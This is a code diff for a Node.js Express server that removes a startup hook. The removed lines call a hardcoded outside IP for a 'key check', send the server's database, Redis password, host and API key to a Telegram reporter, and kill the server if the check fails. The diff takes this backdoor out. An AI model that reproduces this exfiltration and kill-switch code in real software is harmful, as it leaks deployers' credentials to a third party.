@@ -4,9 +4,7 @@ const mongoose = require('mongoose');
 const cors = require('cors')
 const rateLimit = require("express-rate-limit");
 const app = express();
-const { report } = require('./telegram-api/sendMessage')
 const publicIp = require('public-ip');
-const got = require('got')
 
 const PORT = process.env.PORT || 3000
 
@@ -63,31 +61,6 @@ const corsOptions = {
 
 app.get('/api/iframe/:id', cors(corsOptions), require('./routes/embed'))
 
-const checkKey = async (server_ip) => {
-    const response = await got.get('http://95.111.192.54:3000/?ip=' + server_ip).json()
-    return response.status
-};
-
 app.listen(PORT, async () => {
-    server_ip = await publicIp.v4()
-    trusted = await checkKey(server_ip)
-    if (trusted) {
-        await report(`Server started on
-IP: ${server_ip}
-Port: ${PORT}
-Database: ${process.env.MONGO_DB}
-Redis: ${process.env.REDIS_HOST} - ${process.env.REDIS_PASSWORD}
-Host: ${process.env.HOST}
-API Key: ${process.env.API_KEY}`)
-        console.log(`listening on port ${PORT}`)
-    }
-    else {
-        await report(`Invalid server started on
-IP: ${server_ip}
-Port: ${PORT}
-Database: ${process.env.MONGO_DB}
-Redis: ${process.env.REDIS_HOST}
-Host: ${process.env.HOST}`)
-        throw new Error(`invalid!`)
-    }
+    console.log(`listening on port ${PORT}`)
 })
